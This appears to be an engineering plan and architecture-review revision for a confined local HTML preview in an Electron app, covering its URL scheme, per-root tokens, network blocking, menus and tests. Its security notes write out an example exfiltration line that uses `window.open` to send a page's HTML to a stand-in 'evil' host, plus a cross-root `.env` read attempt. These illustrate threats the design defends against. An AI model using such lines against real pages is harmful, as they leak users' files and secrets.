- [ ] Find: `Mod+F` opens the existing `MdFindBar` shape driving the guest's `findInPage` /
      `stopFindInPage`; `Enter`/`Shift+Enter` step; `Escape` closes
- [ ] `aria-pressed` on the toggle, `aria-label` on every icon-only control, live-region
      announcements for view change / reload / block
- [ ] All copy in one `HTML_VIEWER_STRINGS` object; sizes via `Intl.NumberFormat`. **Not
      `src/plural.ts`** — it would render "8 MBs"
- [ ] Give the guest an explicit neutral document ground so a page declaring no `background`
      never shows Conduit's ink through it (spec §11)
- [ ] **Visual check — this task's proof, not a unit test:** `npm run shots`, then look at the
      rendered tab in all three themes, specifically the `.docpage`↔guest seam

#### Task 3.3: The render branch (serial — owns `webview/components/doc-view.tsx`)

**Files:** Modify `webview/components/doc-view.tsx` — `docPage` at `:35`, the ladder at `:92-95`
**Consumes:** `isHtmlDocPath(filePath: string): boolean`; `HtmlViewer`; `useSettings()` for
`htmlDefaultView`; the doc's dirty flag from the existing `dirty-store`.

**Steps:**
- [ ] Insert the branch **between** the PDF and markdown branches; update the ladder comment at
      `:92` to name the new order
- [ ] Extend `docPage` so a rendered HTML tab takes the document tiers — measured absent today
      (M1 `docpageClass:false`)
- [ ] Run `npm run typecheck`

#### Task 3.4: The e2e scenario (serial)

**Files:** Create `test/e2e/html-viewer.e2e.mjs`

**Steps:**
- [ ] Model on `test/e2e/web-view.e2e.mjs:1-60`: the `win32` skip guard, `runScenario`/
      `openSession`, a temp fixture repo with `report.html` + `assets/style.css` + `assets/app.js`,
      the page also attempting `fetch('https://example.invalid/beacon')`
- [ ] Assert the `<webview>` mounted and its `src` starts with `conduit-preview://`
- [ ] Assert **inside the guest**, via `app.evaluate` → `webContents.getAllWebContents()` →
      `getType() === 'webview'` → `executeJavaScript`, that the heading's computed colour is the
      stylesheet's and that the script's marker is set. Host-DOM assertions would pass against a
      guest that rendered nothing
- [ ] Assert the allow-bar appeared naming `example.invalid`, and that after `Allow` the request
      is no longer cancelled
- [ ] Assert `View source` mounts `.monaco-editor` and `View rendered` brings the guest back

---

### Slice 4: Entry points, menus and the guest's own behaviours

**Check:** `npx vitest run test/unit/html-menu.test.ts` exits 0; `node test/e2e/run-smoke.mjs html-viewer` passes end to end **including** reload+scroll,
the guest context menu, Escape-to-chrome and the tab-menu rows; and
`node test/e2e/run-smoke.mjs context-menu-order` is green against its **updated** expectation.

**Parallel groups:** G1: T4.0, T4.1 · G2: T4.2 · Serial: T4.3
**Claims (serial lane):** `webview/app.tsx`, `test/e2e/context-menu-order.e2e.mjs`

#### Task 4.0: `webview/html-menu.ts`

**Files:** Create `webview/html-menu.ts`; Test `test/unit/html-menu.test.ts`
**Produces:** `HtmlMenuContext`, `HtmlMenuAction`, `HtmlMenuItemSpec`, `buildHtmlMenuItems`

**Steps:**
- [ ] Failing test: `'offers Copy disabled without a selection and enabled with one'`
- [ ] Failing test: `'includes the link rows only when a linkURL is present'` — key assertion:
      no `copyLink`/`openLink` ids without one, both with one
- [ ] Failing test: `'never puts a separator on the first rendered item'` — key assertion:
      `items[0].separatorBefore` is falsy in every context (the structural invariant the
      context-menu spec §5 fixes)
- [ ] Run `npx vitest run test/unit/html-menu.test.ts` — expect FAIL (module missing)
- [ ] Implement, mirroring `webview/markdown-menu.ts` — content-menu idiom, sentence case

#### Task 4.1: Explorer menu rows

**Files:** Modify `webview/explorer-menu.tsx` (group 1, beside `Open` at `:71`);
Modify `test/unit/explorer-menu.test.ts`
**Consumes:** `isHtmlDocPath(filePath: string): boolean`

**Steps:**
- [ ] Failing test: `'offers Open preview and Open source for a single .html file'` — key
      assertion: both labels present, neither carrying `separatorBefore` (they join group 1)
- [ ] Failing test: `'omits both for a non-HTML file and for a folder'`
- [ ] Failing test: `'disables both on a multi-selection'` — key assertion: `disabled === true` at
      `n > 1`, per the rule that an item which cannot act on N>1 is visibly disabled, never
      silently narrowed
- [ ] Run `npx vitest run test/unit/explorer-menu.test.ts` — expect FAIL
- [ ] Implement, sentence case, group 1

#### Task 4.2: The shortcut action

**Files:** Modify `webview/shortcuts.ts`
**Produces:** action id `'toggleHtmlView'`, group `'Editor'`, `defaultCombo` `'Mod+Shift+H'`

**Steps:**
- [ ] Add the entry with a WHY comment recording that `Mod+Shift+V` — VS Code's chord — is
      unusable because `Ctrl+Shift+V` is terminal paste (`webview/terminal-clipboard.ts:5`)
- [ ] Run `npx vitest run` for any test enumerating the registry

#### Task 4.3: Wire the renderer (serial — owns `webview/app.tsx`)

**Files:** Modify `webview/app.tsx`; Modify `test/e2e/context-menu-order.e2e.mjs`;
Modify `test/e2e/html-viewer.e2e.mjs`
**Consumes:** `isHtmlDocPath(filePath: string): boolean`; `toggleHtmlView(docId, fallback)`,
`bumpHtmlReload(docId)`, `clearHtmlView(docId)`, `getHtmlView(docId, fallback)`,
`setNetworkAllowed(docId, allowed)` from `webview/html-view-store.ts`;
`buildHtmlMenuItems(ctx)` from `webview/html-menu.ts`.
**Call sites of the deleted local `isHtmlFile` (`app.tsx:161`):** the tab-menu conditional
(`:1844-1852`) and the palette command (`:2544-2553`). Both repointed here; no third exists.

**Steps:**
- [ ] Delete the local `isHtmlFile` at `:161`; repoint both call sites at `isHtmlDocPath`
- [ ] Tab menu (`:1760-1855`): add `View rendered`/`View source` (label from `getHtmlView`) **at
      the position `Open in browser` already occupies**, and relabel that row `Open externally`.
      Delete the now-false comment at `:1842-1843`. Do **not** insert a new group — the
      close-family-first order is frozen for tabs by the context-menu spec §4E
- [ ] Palette: add `Toggle rendered view` and `Reload preview` (no `HTML:` prefix — the palette
      has no prefix convention), **always listed**, disabled with a reason when the active doc is
      not HTML; relabel `cmd:openInBrowser` (`:2544-2553`) to `Open externally`
- [ ] Bind `toggleHtmlView` in the window shortcut handler beside the existing editor actions
- [ ] Handle `html:contextMenu` → `buildHtmlMenuItems` → the shared `ContextMenu`; dispatch
      `html:contextMenuAction` back. Handle `html:escape` → focus the viewer chrome. Handle
      `html:networkBlocked` → the store
- [ ] Call `clearHtmlView(id)` wherever a doc is closed
- [ ] Update `context-menu-order.e2e.mjs` to the **new expected order** for an HTML tab. Its
      assertion is literal item order, so it must be edited; leaving it and claiming "still
      passes" would assert nothing
- [ ] Extend `html-viewer.e2e.mjs`: rewrite the fixture's `report.html` mid-scenario and assert
      the guest's own `document.body.textContent` changed **without** reopening the tab and that
      `scrollY` was restored; right-click the page and assert Conduit's menu opened; press Escape
      inside the guest and assert focus left it
- [ ] Run `node test/e2e/run-smoke.mjs html-viewer` and `… context-menu-order`

---

### Slice 5: Record the decisions

**Check:** `npm run verify` exits 0 on the merged tree.

#### Task 5.1: ADR, changelog, spec status, CLAUDE.md

**Files:** Create `docs/adr/0005-local-html-preview-scheme.md`; Modify `CHANGELOG.md`,
`docs/specs/2026-09-18-html-document-viewing.md`, `CLAUDE.md`

**Steps:**
- [ ] ADR 0005 in the shape of `docs/adr/0004-secret-scanning-and-precommit.md`: context (the
      three-layer `file://` refusal and why it existed), decision (one extra scheme, confinement
      moved into the host, the network blocked by default), consequences (what is now reachable,
      what is still refused, the two `[high]` calls from spec §13)
- [ ] CHANGELOG entry is user-facing: what you can now do, not how it was built
- [ ] CLAUDE.md gains one bullet: the webview is no longer http(s)-only; the gotcha is that
      confinement lives in `electron/preview-protocol.ts`, not in the renderer, and that a
      `<webview>` never surfaces an HTTP error status — which is why the precheck exists
- [ ] Run `npm run verify`, capturing the exit code directly

## Verification

- **Per task:** the named failing test first, then the same command green. No claim without the
  command in the same turn.
- **Per slice:** the slice's `Check` line, run on its own.
- **Before integration:** `npm run verify` (exit code captured directly, never through a pipe or
  pager) plus `node test/e2e/run-smoke.mjs` for `html-viewer`, `web-view`, `context-menu-order`,
  `markdown-viewer`, `editor-preview-tabs` — the five scenarios whose surfaces this touches.
- **On the merged tree:** `npm run verify` again. Per-slice green in isolation does not prove the
  merged tree is green.
- **E2E hygiene:** serial and hidden. Never fan out — parallel load starves ConPTY and fakes PTY
  regressions. Never kill processes by image name; teardown is PID-scoped in `harness.mjs`.

## Deviation rule

If a task's assumption turns out wrong — a locked signature doesn't fit, `protocol.handle` won't
bind to the partition session, the guest refuses the scheme — that task **stops** and fixing the
misaligned piece becomes the work. Never a shim, second copy, special case, widened type,
fallback, or an override patched in place of its semantic source. In particular: **never** reach
for `file://`, `webSecurity: false`, or `allowFileAccessFromFileURLs` to make a page render, and
never allow the network by default to make a CDN-using fixture pass. Those defeat the entire
confinement argument; a preview that needs them is a stop-and-report. The report leads with the
fix that keeps the locked decision.

## Decisions Needed

- **[high]** Scripts execute, with the network blocked by default — carried from spec §13.
- **[high]** The http(s)-only guest invariant widens by one scheme; this plan makes the nav guard
  *session-aware*, tighter than the spec required.
- **[normal]** Remote sub-resources blocked until allowed per tab — the most visible behaviour
  change; a CDN-using page renders unstyled until `Allow`.
- **[normal]** Sub-resource changes do not auto-reload; `Reload` covers it.
- **[normal]** `Mod+Shift+H` bound by default (`Mod+Shift+V` rejected — terminal paste).
- **[normal]** The view choice survives a tab switch, where Markdown's does not.
- **[normal]** Only the active preview guest stays mounted; returning to a preview tab reloads.

---

# Revision 2 — deltas from the architecture review

These **supersede** the corresponding text above. Everything not listed stands. Each item was
verified against `node_modules/electron/electron.d.ts` (43.3.0) before being accepted.

## Contract changes

**C1 — `src/preview-url.ts` is redesigned around a per-root token (SECURITY; supersedes the
URL-shape table and INV-2/INV-3).** The volume-as-host shape made a whole drive one web origin,
so a previewed page could `fetch('conduit-preview://g/other-project/.env')` same-origin and read
any file in any open root. The host is now an **opaque per-run token identifying one workspace
root**, so each root is its own origin and the browser refuses a cross-root read before our
handler is ever consulted.

```ts
export const PREVIEW_SCHEME = 'conduit-preview';
export function buildPreviewUrl(rootToken: string, relSegments: readonly string[]): string;
export function parsePreviewUrl(url: string): { token: string; segments: string[] } | null;
export function isPreviewUrl(src: string): boolean;
export function isValidRootToken(token: string): boolean;   // 8-32 chars of [a-z0-9]
export function previewContentType(pathOrExt: string): string;
export type PreviewReason = 'blocked' | 'too-large' | 'missing' | 'unsupported' | 'unreadable';
```

`parsePreviewUrl` returns `null` for a foreign scheme, an invalid/empty token, an empty path, or
any `.`/`..` segment (raw or percent-encoded) — traversal is refused at the parse boundary.
**Deleted:** `PathShape`, `pathShape`, `previewUrlForPath`, `pathForPreviewUrl`, and all
drive/UNC/posix/`localhost` handling. The module never sees an absolute path, so INV-2 and INV-3
no longer apply and the `process.platform` hazard is gone. INV-6 (no node builtins) still holds
and is now trivial.

`PreviewReason` moves here from `electron/preview-protocol.ts`: `src/protocol.ts` is in
`tsconfig.webview.json`'s include, so importing the type from `electron/` would drag a module
importing `node:fs` into the renderer's type program and invert the plan's own layering rule.

**C2 — the host owns a token table.** `electron/preview-protocol.ts` keeps
`Map<token, rootPath>`, minted per app run, one token per entry of `writeRoots()`. Resolution is
`token` to root, then join the decoded segments, then the INV-1 pair (`isInsideAnyRoot` +
`realPathLeaf`) as defence in depth against anything the parse boundary missed.

**C3 — the network-allow flag is keyed on the GUEST, not the doc (SECURITY).**
`session.fromPartition()` returns one process-global session accepting one `onBeforeRequest`
listener, and Conduit is multi-window (`main.ts:3449` `spawnWindow`, `:3486` restores N). A
per-doc flag therefore could not be honoured: allowing report A in window 1 would unblock
report B in window 2, and `onBlocked` could only `broadcast()`, putting a wrongly-attributed bar
in every window. `OnBeforeRequestListenerDetails` carries `webContents`/`webContentsId`
(`electron.d.ts:22627-22628`) and `WebviewTag.getWebContentsId()` exists (`:19949`), so:

```ts
export function registerPreviewProtocol(
  ses: Session,
  getRoots: () => string[],
  isNetworkAllowed: (guestId: number | undefined) => boolean,
  onBlocked: (guestId: number | undefined, host: string) => void,
): void;
```

The **host** owns `allowedGuests: Set<number>` — it is the enforcement point, so it is the single
source of truth; `webview/html-view-store.ts` drops the allow flag and keeps only view mode,
reload nonce and scroll. The renderer reports `html:guestReady{docId, guestId}` on the guest's
`dom-ready`. `onBlocked` routes to exactly one window via
`webContents.fromId(guestId)?.hostWebContents` (`electron.d.ts:18557`), never `broadcast`.
Entries clear on the guest's `destroyed` event, so no lifecycle bookkeeping is needed.
`html:escape` routes the same way.

**C4 — external opens from a preview guest are gated (SECURITY).** Routing a preview guest's
`http(s)` navigation or popup straight to `openExternalUrl` (`main.ts:860-867`) passes the **full
URL including its query string** to `shell.openExternal`, so
`window.open('https://evil/?d=' + btoa(document.documentElement.outerHTML))` exfiltrates with no
block and no bar. `HandlerDetails` (`electron.d.ts:21740-21760`) carries no user-gesture flag, so
a click and a script are indistinguishable. A preview guest's external open therefore goes
through the **same allow gate** as a blocked resource: "This page wants to open `<host>` —
Allow". Never a silent hand-off.

**C5 — IPC message set changes.** **Delete** `html:contextMenu` and `html:contextMenuAction`:
`WebviewTag` has a DOM-level `context-menu` event carrying `ContextMenuEvent`
(`electron.d.ts:19856`, params `:20923-20940`), so the renderer builds the menu directly and the
host round-trip is dead weight. **Add** `html:guestReady{docId, guestId}`; **change**
`html:setNetworkAllowed` to carry `guestId`, not `docId`; **generalise** `html:escape` to
`html:guestKey{ guestId, key }` so `Mod+F` rides the same channel (see S8).

## Slice changes

**S1 — Slice 2 opens with a spike, rather than ending with a non-regression.** Three unknowns all
resolve in one ~30-line e2e and all invalidate Slice 3 if wrong: does `ses.protocol.handle` on a
privileged scheme actually feed a `<webview>` guest; does `corsEnabled:false` +
`supportFetchAPI:true` break same-origin `fetch` inside the page (a known sharp edge — Chromium
refuses non-http(s) schemes absent from the CORS-enabled list); and does deferring `src` past
`will-attach-webview` permanently refuse the guest (`hardenWebviewPrefs` refuses a non-allowed
`src`, and the whole precheck design assumes a lazily-created guest). Run it first. Also drop
`stream: true` from the privilege set — `protocol.handle` returns a `Response`, whose body
already streams, and leaving it in implies `registerStreamProtocol` is involved.

**S2 — exactly ONE `app.on('web-contents-created')` listener, branching inside.**
`main.ts:3501-3510` already installs `setWindowOpenHandler` and `will-navigate` on every guest. A
second registration would silently **replace** the existing window-open handler for all guests
(last writer wins), and its `will-navigate` listener could not re-allow what the existing one
already `preventDefault`ed — preventDefault from any listener is final.

**S3 — identify a preview guest by its URL, not by session identity.**
`contents.session === previewSession` works but is an undocumented implementation guarantee.
`isPreviewUrl(contents.getURL())` answers the only question the guards actually ask.

**S4 — `crashed` does not exist; use `render-process-gone`.** `WebviewTag` has no `crashed` event
(removed with the WebContents one in Electron 22); it has `render-process-gone`
(`electron.d.ts:19803`) and `destroyed` (`:19808`). The planned crashed state would have been
dead code that never rendered. The host already models this shape in its own
`render-process-gone` handler.

**S5 — the guest context menu is built in the renderer.** `webview/html-menu.ts` stays (pure
builder, same tests) but is consumed by `html-viewer.tsx` off the element's own `context-menu`
event, so Task 4.0 moves into Slice 3 beside the viewer. Worth one comment: `context-menu` is
available as a DOM event on the element while `before-input-event` is not, which is the real
reason the key path needs the host and otherwise looks arbitrary.

**S6 — reload keys on a per-path version counter, not `doc.content`.** `readFile` truncates at
`MAX_BYTES` (`src/file-service.ts:17`, 2 MB), so two versions of a >2 MB file sharing their first
2 MB produce **no reload**, and a byte-identical rewrite produces none either — while a 2 MB
string crosses IPC on every change purely to act as a signal. Bump a counter on `fileChanged` for
that path and key the reload effect on it.

**S7 — scroll must survive a tab switch, not just a reload.** `center-pane.tsx:358` keys
`DocView` on `activeDoc.id` and renders only the active doc, so every tab switch **destroys the
guest OS process** and recreates it. The planned scroll restore is keyed on
`[content, reloadNonce]` and explicitly skipped on first mount, so it would not run on remount.
Persist `scrollY` per doc in `html-view-store.ts` and restore on mount. Corollary: the planned
"mount the guest only for the active doc" step is a no-op — that is already the default, and the
`web`-tab warm-keeping at `center-pane.tsx:309-318` is the special case, not the rule. Delete the
step; keep the note in the ADR.

**S8 — `Mod+F` must be forwarded from the guest.** Once focus is inside the page — which is where
a reader will be — the host renderer never sees the keydown, so the planned Find binding is
unreachable exactly when it is wanted. Forward it through the same `before-input-event` handler
as Escape, via `html:guestKey`.

**S9 — name the path shape in every `preview-verdict` test.** `isInsideAnyRoot` to
`isInsideRoot` branches on `process.platform === 'win32'` (`src/path-guard.ts:35`) and uses
`path.resolve`, so on ubuntu CI `path.resolve('G:\\a\\r.html')` yields a nonsense relative
resolution. The verdict tests must use posix-shaped fixtures, or inject the containment
predicate. This is the CLAUDE.md trap the plan already cites for `preview-url.ts` but not where
it actually bites.

## Cuts (dead code the `fallow` gate would fail on)

- **`isAllowedGuestUrl`** — no consumer; `hardenWebviewPrefs` inlines the check and the nav guard
  uses `isPreviewUrl`. Deleted.
- **`allowPreviewRequest`** — it is `isPreviewUrl(url) || networkAllowed`. Three unit assertions
  about a one-liner, while the real risks (does `onBeforeRequest` fire, does cancel stick, is it
  per-guest) go untested. Inline it; spend the budget on the e2e.
- **`previewVerdict(url, …)`** — the same function as `previewVerdictForPath`. Keep the path
  form; the URL entry point is `parsePreviewUrl` then the path form.
- **`pathShape` / `PathShape`** — gone with C1.

## Newly scoped out, recorded rather than silently dropped

- **Roots closing while a preview is open** has no state transition: the page stays on screen and
  subresources start 404ing. Accepted for v1; `Reload` surfaces it as an error.
- **The precheck/handler race** (file deleted between `canPreview` and the load) yields a blank
  pane, since a `<webview>` surfaces no HTTP status. Mitigated by serving a recognisable error
  document for the main-frame case rather than a bare 404 body.
- **"The network is blocked" is an overclaim** and the ADR must say so: `webRequest` cannot reach
  WebRTC, `dns-prefetch`/`preconnect` hostname leaks, or C4's external-open channel. The
  invariant is "blocks resource loads", not "blocks the network".
- **The in-memory session is never cleared** for the app's lifetime, so it accumulates cache and
  storage from every allowed host. INV-4 is about disk and still holds; "in-memory" must not be
  read as "ephemeral per tab".
- **`Back` + reload interaction:** after an in-page navigation, an external change must
  `loadURL(previewUrl)` rather than `reload()`, or "the preview follows the file" silently fails.
- **No devtools on the guest.** `el.openDevTools()` behind the context menu is two lines and is
  the only way to diagnose a preview that renders wrong. Deferred, not forgotten.

## Conductor amendment to the file map

`test/e2e/preview-transport.e2e.mjs` (create) — the Slice 2 spike, promoted from a throwaway to
a **repo scenario**. It is the only thing that proves the transport works at all, and it is a
durable regression test for the scheme, so it belongs in the suite rather than in a scratch
directory. Slice 2's check becomes: `npx vitest run test/unit/preview-verdict.test.ts` **and**
`node test/e2e/run-smoke.mjs preview-transport` **and** `node test/e2e/run-smoke.mjs web-view`.

It answers, in one launch, the three unknowns that would invalidate Slice 3 if wrong, plus the
two security properties the design now rests on:

1. Does `ses.protocol.handle` on a privileged scheme actually feed a `<webview>` guest?
2. Do **relative** subresources resolve (the whole justification for the URL shape)?
3. Does `corsEnabled:false` + `supportFetchAPI:true` break a **same-origin** `fetch` inside the
   page? (Chromium refuses non-http(s) schemes absent from the CORS-enabled list — a known sharp
   edge, and if it bites, the privilege set has to change before anything is built on it.)
4. **Cross-root isolation:** a page in root A `fetch`ing root B's token must FAIL. This is the
   property the whole revision-3 URL shape exists to provide; unproven, it is a claim, not a
   control.
5. **The network block:** a remote `fetch` must be cancelled and must raise the blocked notice.

Written and run by the session, not an executor — it drives the real app, and a smoke loop is
not delegated work.

## Conductor note — scroll write cadence (from Slice 3 G1)

`setHtmlScroll` notifies subscribers on change, uniform with every other setter in the store.
That is correct for the store and wrong for a naive caller: if the viewer writes scroll on every
guest scroll tick, each tick re-renders every subscriber. **The viewer writes scroll at capture
points only** — immediately before a reload, and on unmount — never on a scroll event. If a live
scroll read is ever needed, it is read from the guest at the capture point, not mirrored into the
store continuously. Flagged by the executor rather than special-cased inside the store, which was
the right call: the store has no business knowing its caller's cadence.
